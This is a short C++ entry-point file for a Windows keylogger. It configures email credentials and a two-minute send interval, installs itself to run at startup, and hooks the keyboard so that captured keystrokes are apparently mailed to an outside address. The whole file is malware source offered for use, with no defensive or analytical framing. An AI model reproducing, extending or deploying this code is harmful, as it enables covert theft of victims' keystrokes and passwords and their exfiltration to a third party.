
#include "autorun.h"
#include "keybhook.h"

#include <windows.h>

/* Mail send settings */
#define TO_MAIL "destination@gmail.com"
#define FROM_MAIL "sender@gmail.com"
#define PASSWORD  "password"
#define TIME_MAIL 2000*60

int main()
{
    MSG Msg;
    Autorun::installKeyLogger();
    KeybHook::InstallHook(TO_MAIL,FROM_MAIL,PASSWORD, TIME_MAIL);

    while (GetMessageA (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessageA(&Msg);
    }

    exit(EXIT_FAILURE);
}

